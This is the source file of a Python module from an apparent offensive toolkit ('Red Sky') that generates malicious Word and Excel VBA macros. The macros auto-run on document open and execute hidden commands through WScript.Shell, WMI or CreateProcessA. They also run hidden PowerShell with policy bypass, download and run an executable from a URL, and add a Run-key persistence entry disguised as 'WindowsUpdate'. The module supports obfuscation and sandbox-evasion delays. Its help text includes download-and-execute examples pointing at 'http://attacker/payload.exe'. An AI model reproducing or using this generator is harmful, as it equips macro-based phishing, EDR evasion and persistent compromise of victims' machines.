# language: Python, file: Program/macro/vba.py, target: Red Sky macro — VBA macro generator
# Generates VBA source for Word (.docm/.dotm) and Excel (.xlsm/.xlsb) documents.
# Subcommands:
#   shell       -- WScript.Shell.Run(<cmd>) execution
#   wmi         -- WMI Win32_Process.Create execution (bypasses parent-child heuristics)
#   win32       -- direct Win32 API (CreateProcessA via PtrSafe Declare)
#   powershell  -- Shell + encoded PS (base64 -w hidden)
#   download    -- download + execute via MSXML2.XMLHTTP + ADODB.Stream
#   persist     -- add to HKCU Run key on first open
# Every generator supports:
#   --trigger autoopen | document_open | workbook_open | newm
#   --obfuscate chr | base64 | split | none
#   --sandbox-delay N  (WinAPI Sleep loop, no Application.Wait which can be detected)

import argparse
import base64
import json
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


MACRO_DIR = OUTPUT_DIR / "macro"
VBA_DIR = MACRO_DIR / "vba"
VBA_DIR.mkdir(parents=True, exist_ok=True)


# ── trigger headers ──
TRIGGERS = {
    "autoopen":      ("Sub AutoOpen()", "End Sub"),
    "document_open": ("Sub Document_Open()", "End Sub"),
    "workbook_open": ("Sub Workbook_Open()", "End Sub"),
    "newm":          ("Sub Auto_Open()\n    On Error Resume Next\n    ActiveDocument.Content.InsertParagraphAfter", "End Sub"),
    "excel_auto":    ("Sub Auto_Open()", "End Sub"),
}

# ── shared decoder + delay boilerplate ──
DECODER_B64 = r'''
Private Function B64Dec(ByVal s As String) As Byte()
    Dim o As Object
    Set o = CreateObject("MSXML2.DOMDocument")
    Dim n As Object
    Set n = o.createElement("b")
    n.DataType = "bin.base64"
    n.Text = s
    B64Dec = n.NodeTypedValue
    Set o = Nothing
    Set n = Nothing
End Function

Private Sub WriteExe(ByVal path As String, ByVal data As Byte())
    Dim f As Integer
    f = FreeFile
    Open path For Binary Access Write As #f
    Put #f, , data
    Close #f
End Sub
'''

DECODER_CHR = r'''
Private Function ChrDec(ByVal s As String) As String
    Dim parts() As String
    parts = Split(s, ",")
    Dim i As Long
    Dim out As String
    For i = LBound(parts) To UBound(parts)
        out = out & Chr(CInt(parts(i)))
    Next i
    ChrDec = out
End Function
'''

DELAY = r'''
Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

Private Sub DoDelay()
    Sleep {ms}
End Sub
'''


def _chr_chain(s: str) -> str:
    return ",".join(str(ord(c)) for c in s)


def _split_string(s: str, chunk: int = 20) -> str:
    parts = [s[i:i+chunk] for i in range(0, len(s), chunk)]
    quoted = " & _\n        ".join('"' + p.replace('"', '""') + '"' for p in parts)
    return quoted


def _obfuscate_payload(payload: str, mode: str) -> Dict[str, str]:
    """Returns {'prelude': ..., 'expr': ..., 'postlude': ...} for the generator to slot in."""
    if mode == "none":
        return {"prelude": "", "expr": '"' + payload.replace('"', '""') + '"', "postlude": ""}
    if mode == "chr":
        return {"prelude": DECODER_CHR, "expr": 'ChrDec("' + _chr_chain(payload) + '")', "postlude": ""}
    if mode == "split":
        return {"prelude": "", "expr": _split_string(payload), "postlude": ""}
    if mode == "base64":
        # encode as base64 and let VBA decode it to a string
        b = base64.b64encode(payload.encode()).decode()
        return {
            "prelude": DECODER_B64 + "\n\nPrivate Function B64Str(ByVal s As String) As String\n    B64Str = StrConv(B64Dec(s), vbUnicode)\nEnd Function\n",
            "expr": 'B64Str("' + b + '")',
            "postlude": "",
        }
    raise ValueError("unknown obfuscate mode: " + mode)


def _build_shell(cmd: str, obf: str, delay_ms: int) -> Dict[str, str]:
    payload = cmd
    enc = _obfuscate_payload(payload, obf)
    body = []
    if delay_ms:
        body.append(DELAY.replace("{ms}", str(delay_ms)))
    if enc["prelude"]:
        body.append(enc["prelude"])
    body.append(r'''
Private Sub RunIt()
    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    Dim cmd As String
    cmd = ''' + enc["expr"] + r'''
    sh.Run cmd, 0, False
End Sub
''')
    return {"body": "\n".join(body), "call": "RunIt"}


def _build_wmi(cmd: str, obf: str, delay_ms: int) -> Dict[str, str]:
    enc = _obfuscate_payload(cmd, obf)
    body = []
    if delay_ms:
        body.append(DELAY.replace("{ms}", str(delay_ms)))
    if enc["prelude"]:
        body.append(enc["prelude"])
    body.append(r'''
Private Sub RunIt()
    Dim wmi As Object
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Dim proc As Object
    Set proc = wmi.Get("Win32_Process")
    Dim res As Object
    Dim cmd As String
    cmd = ''' + enc["expr"] + r'''
    Set res = proc.Create(cmd, Null, Null, 0)
    ' no parent-child from Word -> often invisible to EDR heuristics
End Sub
''')
    return {"body": "\n".join(body), "call": "RunIt"}


def _build_win32(cmd: str, obf: str, delay_ms: int) -> Dict[str, str]:
    enc = _obfuscate_payload(cmd, obf)
    body = []
    if delay_ms:
        body.append(DELAY.replace("{ms}", str(delay_ms)))
    if enc["prelude"]:
        body.append(enc["prelude"])
    body.append(r'''
Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Declare PtrSafe Function CreateProcessA Lib "kernel32" ( _
    ByVal lpApplicationName As String, _
    ByVal lpCommandLine As String, _
    ByVal lpProcessAttributes As Long, _
    ByVal lpThreadAttributes As Long, _
    ByVal bInheritHandles As Long, _
    ByVal dwCreationFlags As Long, _
    ByVal lpEnvironment As Long, _
    ByVal lpCurrentDirectory As String, _
    ByRef lpStartupInfo As STARTUPINFO, _
    ByRef lpProcessInformation As PROCESS_INFORMATION) As Long

Private Sub RunIt()
    Dim si As STARTUPINFO
    Dim pi As PROCESS_INFORMATION
    si.cb = Len(si)
    Dim cmd As String
    cmd = ''' + enc["expr"] + r'''
    ' CREATE_NO_WINDOW (0x08000000) | DETACHED_PROCESS (0x00000008)
    CreateProcessA vbNullString, cmd, 0, 0, 0, &H8000008, 0, vbNullString, si, pi
End Sub
''')
    return {"body": "\n".join(body), "call": "RunIt"}


def _build_powershell(cmd: str, obf: str, delay_ms: int) -> Dict[str, str]:
    ps = "powershell -w hidden -nop -ep bypass -c " + cmd
    return _build_shell(ps, obf, delay_ms)


def _build_download(url: str, obf: str, delay_ms: int) -> Dict[str, str]:
    enc = _obfuscate_payload(url, obf)
    body = []
    if delay_ms:
        body.append(DELAY.replace("{ms}", str(delay_ms)))
    body.append(DECODER_B64)
    if enc["prelude"]:
        body.append(enc["prelude"])
    body.append(r'''
Private Sub RunIt()
    Dim http As Object
    Set http = CreateObject("MSXML2.XMLHTTP")
    Dim url As String
    url = ''' + enc["expr"] + r'''
    http.Open "GET", url, False
    http.Send

    Dim stream As Object
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile Environ("TEMP") & "\rs_payload.exe", 2
    stream.Close

    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    sh.Run Environ("TEMP") & "\rs_payload.exe", 0, False
End Sub
''')
    return {"body": "\n".join(body), "call": "RunIt"}


def _build_persist(cmd: str, obf: str, delay_ms: int) -> Dict[str, str]:
    enc = _obfuscate_payload(cmd, obf)
    body = []
    if delay_ms:
        body.append(DELAY.replace("{ms}", str(delay_ms)))
    if enc["prelude"]:
        body.append(enc["prelude"])
    body.append(r'''
Private Sub RunIt()
    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    Dim val As String
    val = ''' + enc["expr"] + r'''
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", val, "REG_SZ"
End Sub
''')
    return {"body": "\n".join(body), "call": "RunIt"}


BUILDERS = {
    "shell":      _build_shell,
    "wmi":        _build_wmi,
    "win32":      _build_win32,
    "powershell": _build_powershell,
    "download":   _build_download,
    "persist":    _build_persist,
}


def _assemble(trigger: str, body: str, call: str) -> str:
    start, end = TRIGGERS.get(trigger, TRIGGERS["autoopen"])
    # split Sub line: if it has args, drop them into the body; otherwise just add the call
    return (
        "' " + "Red Sky macro — vba payload" + "\n"
        "Option Explicit\n\n"
        + body + "\n\n"
        + start + "\n"
        "    On Error Resume Next\n"
        "    " + call + "\n"
        + end + "\n"
    )


def cmd_gen(kind: str, cmd: str, trigger: str, obfuscate: str, delay_ms: int,
            out_file: str) -> int:
    if kind not in BUILDERS:
        print_err("unknown payload kind: " + kind)
        print_info("available: " + ", ".join(BUILDERS.keys()))
        return 2
    if not cmd:
        print_err("--cmd required")
        return 2

    build = BUILDERS[kind](cmd, obfuscate, delay_ms)
    vba = _assemble(trigger, build["body"], build["call"])

    out = Path(out_file) if out_file else VBA_DIR / (kind + "_" + trigger + "_" + str(int(time.time())) + ".vba")
    out.write_text(vba)
    print_ok("wrote " + str(out))
    print_kv("kind", kind)
    print_kv("trigger", trigger)
    print_kv("obfuscate", obfuscate)
    print_kv("delay_ms", str(delay_ms))
    print_kv("bytes", str(len(vba)))
    print()
    print_info("import into a .docm / .xlsm:")
    print("  1. open the Office document (trusted location or enable macros)")
    print("  2. Alt+F11 -> Insert -> Module -> paste the contents of the .vba file")
    print("  3. save as .docm (Word) or .xlsm (Excel)")
    print()
    if kind == "download":
        print_info("payload download path: %TEMP%\\rs_payload.exe")
    return 0


def cmd_list() -> int:
    print_info(str(len(BUILDERS)) + " VBA payload kinds")
    print()
    for k in BUILDERS:
        print("  " + SCARLET + "*" + RESET + " " + BONE + k + RESET)
    print()
    print_info("triggers: " + ", ".join(TRIGGERS.keys()))
    print_info("obfuscate modes: none, chr, base64, split")
    return 0


def run_cli(args):
    p = argparse.ArgumentParser(prog="redsky macro vba", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="list", choices=["list", "gen"])
    p.add_argument("kind", nargs="?", default="shell")
    p.add_argument("--cmd", default="", help="command to run (or URL for download kind)")
    p.add_argument("--trigger", default="autoopen", choices=list(TRIGGERS.keys()))
    p.add_argument("--obfuscate", default="none", choices=["none", "chr", "base64", "split"])
    p.add_argument("--delay", type=int, default=3000, help="sandbox delay in ms")
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky macro vba <list|gen> [kind] --cmd '...' [--trigger X] [--obfuscate Y] [--delay ms]")
        return 2

    if ns.help:
        print_info("list")
        print_info("gen shell --cmd 'cmd.exe /c calc.exe' --trigger autoopen --obfuscate chr --delay 5000")
        print_info("gen powershell --cmd 'IEX (New-Object Net.WebClient).DownloadString(\"http://x/ps\")'")
        print_info("gen download --cmd 'http://attacker/payload.exe' --obfuscate base64")
        print_info("gen persist --cmd 'C:\\Users\\Public\\stager.exe'")
        return 0

    if ns.action == "list":
        return cmd_list()
    return cmd_gen(ns.kind, ns.cmd, ns.trigger, ns.obfuscate, ns.delay, ns.out)


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
